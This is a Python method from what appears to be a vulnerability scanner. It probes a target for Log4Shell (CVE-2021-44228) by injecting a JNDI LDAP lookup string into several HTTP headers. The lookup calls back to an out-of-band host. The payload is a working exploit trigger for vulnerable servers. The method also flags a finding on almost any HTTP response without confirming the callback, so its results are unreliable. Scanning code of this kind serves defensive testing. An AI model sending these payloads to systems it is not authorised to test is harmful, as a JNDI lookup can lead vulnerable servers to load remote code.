    def test_cve_2021_44228_log4shell_enhanced(self):
        """CVE-2021-44228 — Log4Shell enhanced detection (multi-vector)."""
        if not self.deep: return
        self._print("[*]", "CVE-2021-44228: Log4Shell enhanced...", "INFO")
        try:
            if not self.oob_host: return
            marker = hashlib.md5(self.target.encode()).hexdigest()[:8]
            payload = "${jndi:ldap://" + self.oob_host + "/" + marker + "}"
            vectors = [
                ("/", "User-Agent", payload),
                ("/", "X-Api-Version", payload),
                ("/", "X-Forwarded-For", payload),
                ("/login", "Referer", payload),
                ("/", "X-Forwarded-Host", payload),
                ("/api/v1/test", "X-Custom", payload),
            ]
            for path, hdr, val in vectors:
                url = urljoin(self.target, path)
                headers = {hdr: val}
                r = self._get(url, timeout=8, headers=headers)
                # OOB verification is async; flag potential exposure if endpoint accepts
                if r and r.status_code in (200, 201, 204, 400, 500):
                    self._add_vuln("CVE-2021-44228 Log4Shell (potential exposure)",
                                   "HIGH", url,
                                   "Injected JNDI lookup via " + hdr + " header",
                                   cve="CVE-2021-44228", path=path, header=hdr)
                    break
        except Exception:
            pass

